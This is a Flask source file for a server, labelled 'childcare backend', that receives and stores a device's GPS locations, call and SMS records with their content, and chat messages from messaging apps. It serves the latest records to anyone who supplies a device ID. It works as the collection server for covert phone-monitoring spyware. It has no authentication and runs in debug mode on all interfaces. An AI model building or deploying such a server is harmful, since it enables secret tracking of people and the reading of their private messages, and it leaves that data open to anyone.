from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///security_system.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)


class LocationLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_uid = db.Column(db.String(100), nullable=False)
    latitude = db.Column(db.Float, nullable=False)
    longitude = db.Column(db.Float, nullable=False)
    timestamp = db.Column(db.String(50), nullable=False)


class TelephonyLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_uid = db.Column(db.String(100), nullable=False)
    log_type = db.Column(db.String(20), nullable=False)
    address = db.Column(db.String(50), nullable=False)
    content = db.Column(db.Text, nullable=True)
    timestamp = db.Column(db.String(50), nullable=False)


class ChatLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_uid = db.Column(db.String(100), nullable=False)
    app_name = db.Column(db.String(50), nullable=False)
    sender = db.Column(db.String(100), nullable=False)
    message = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.String(50), nullable=False)


with app.app_context():
    db.create_all()


@app.route('/')
def index():
    return jsonify({"status": "ok", "service": "childcare backend"}), 200


@app.route('/api/v1/upload-logs', methods=['POST'])
def upload_logs():
    data = request.get_json()
    if not data or 'device_uid' not in data:
        return jsonify({"error": "Missing device_uid"}), 400

    uid = data['device_uid']

    for loc in data.get('locations', []):
        db.session.add(LocationLog(
            device_uid=uid,
            latitude=loc['latitude'],
            longitude=loc['longitude'],
            timestamp=loc['timestamp']
        ))

    for tel in data.get('telephony', []):
        db.session.add(TelephonyLog(
            device_uid=uid,
            log_type=tel['type'],
            address=tel['address'],
            content=tel.get('content', ''),
            timestamp=tel['timestamp']
        ))

    for chat in data.get('chats', []):
        db.session.add(ChatLog(
            device_uid=uid,
            app_name=chat['app_name'],
            sender=chat['sender'],
            message=chat['message'],
            timestamp=chat['timestamp']
        ))

    db.session.commit()
    return jsonify({"status": "success"}), 200


@app.route('/api/v1/get-logs/<device_uid>', methods=['GET'])
def get_logs(device_uid):
    locs = LocationLog.query.filter_by(device_uid=device_uid).order_by(LocationLog.id.desc()).limit(10).all()
    tels = TelephonyLog.query.filter_by(device_uid=device_uid).order_by(TelephonyLog.id.desc()).limit(10).all()
    chats = ChatLog.query.filter_by(device_uid=device_uid).order_by(ChatLog.id.desc()).limit(10).all()

    return jsonify({
        "locations": [{"lat": l.latitude, "lng": l.longitude, "time": l.timestamp} for l in locs],
        "telephony": [{"type": t.log_type, "addr": t.address, "content": t.content, "time": t.timestamp} for t in tels],
        "chats": [{"app": c.app_name, "sender": c.sender, "msg": c.message, "time": c.timestamp} for c in chats]
    }), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
